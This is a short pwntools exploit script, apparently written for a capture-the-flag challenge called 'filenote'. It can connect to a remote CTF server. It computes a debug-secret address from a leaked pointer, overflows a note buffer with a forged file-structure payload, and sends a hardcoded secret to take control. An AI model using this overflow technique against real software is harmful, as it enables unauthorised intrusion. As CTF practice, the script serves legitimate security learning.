from pwn import *

context.arch = 'amd64'
# context.binary = 'am64'
context.terminal = ['tmux', 'splitw', '-h']

if args['REMOTE']:
    p = remote('edu-ctf.zoolab.org', 30216 )
else:
    p = process('./filenote_w/chal')

p.recvuntil("0x")

note_buf = int(p.recvline(), base = 16)
debug_secret = note_buf - 0x30

print(hex(note_buf))
print(hex(debug_secret))

p.sendlineafter(">", "1")
p.sendlineafter(">", "2")

# flags = 0x0800

payload = flat(
    0, 0,
    0, 0,
    0, 0,
    0, debug_secret,
    debug_secret + 0x10, 0,
    0, 0,
    0, 0,
    0
)

p.sendlineafter("data>", b"A" * 0x210 + payload)
p.sendlineafter(">" , "4")
p.sendline("gura_50_cu73\x00")

# gdb.attach(p)

p.interactive()